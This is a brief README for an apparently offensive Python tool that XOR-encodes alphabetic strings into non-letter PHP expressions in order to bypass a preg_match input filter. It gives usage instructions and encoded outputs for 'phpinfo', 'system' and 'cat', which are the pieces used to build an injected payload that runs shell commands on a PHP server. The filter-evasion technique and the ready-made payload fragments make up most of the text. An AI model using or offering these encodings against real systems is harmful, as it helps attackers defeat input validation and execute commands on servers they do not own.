# PHP-non-alpha-encoder
Encode alpha string (a-zA-Z) using XOR to bypass PHP condition such as `if(!preg_match('/[a-zA-Z\``]/', "yourPayload")`

## How to use

`python <path_to_script> <alpha_string_to_encode>`

"phpinfo" => ("@"^"0").("["^"3").("@"^"0").("["^"2").("^"^"0").("^"^"8").("_"^"0")
    "phpinfo()" => incorrect output as '(' and ')' are non alpha char
    "sys2" => incorrect output as '2' is a non alpha charù
    
## Examples

### phpinfo

`python <path_to_script> "phpinfo"`

output: `("@"^"0").("["^"3").("@"^"0").("["^"2").("^"^"0").("^"^"8").("_"^"0")`

### system

`python <path_to_script> "system"`

output: `("@"^"3").("@"^"9").("@"^"3").("@"^"4").("]"^"8").("]"^"0")`

### cat

`python <path_to_script> "cat"`

output: `("["^"8").("@"^"!").("@"^"4")`
